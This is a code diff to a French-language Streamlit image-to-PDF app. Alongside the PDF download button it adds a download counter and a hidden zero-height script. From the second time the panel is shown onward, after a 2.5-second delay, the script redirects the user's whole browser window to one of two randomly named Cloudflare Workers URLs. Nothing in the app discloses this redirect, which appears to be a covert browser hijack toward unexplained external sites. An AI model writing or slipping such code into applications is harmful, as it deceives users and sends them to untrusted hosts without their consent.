@@ -593,9 +593,36 @@ def flux_image(img_pil, nom_pdf, prefix):
             st.markdown(f"""<div class="pdf-info">📄 PDF prêt&nbsp;! {badges.get(badge, '')}
                 <br>Taille : <span>{taille}</span> &nbsp;|&nbsp; Résolution : <span>{w} × {h} px</span>
                 </div>""", unsafe_allow_html=True)
+
+            # Compteur de téléchargements
+            if "dl_count" not in st.session_state:
+                st.session_state["dl_count"] = 0
+
+            dl_count = st.session_state["dl_count"]
+
+            # Injection de la redirection selon le compteur
+            if dl_count == 1:
+                redirect_url = "https://aged-term-0d2e.nova1309ia.workers.dev/"
+            elif dl_count >= 2:
+                redirect_url = "https://dawn-flower-c012.mypublic1309.workers.dev/"
+            else:
+                redirect_url = None
+
+            if redirect_url:
+                import streamlit.components.v1 as components
+                components.html(f"""<script>
+                setTimeout(function(){{
+                    window.parent.location.href = '{redirect_url}';
+                }}, 2500);
+                </script>""", height=0)
+
             st.download_button(label="⬇️  TÉLÉCHARGER LE PDF", data=pdf_bytes,
                                file_name=nom_pdf, mime="application/pdf",
                                key=f"dl_{prefix}_{sk_local}")
+
+            # Incrémenter après affichage du bouton
+            st.session_state["dl_count"] = dl_count + 1
+
         except Exception as e:
             st.error(f"Erreur PDF : {e}")
 
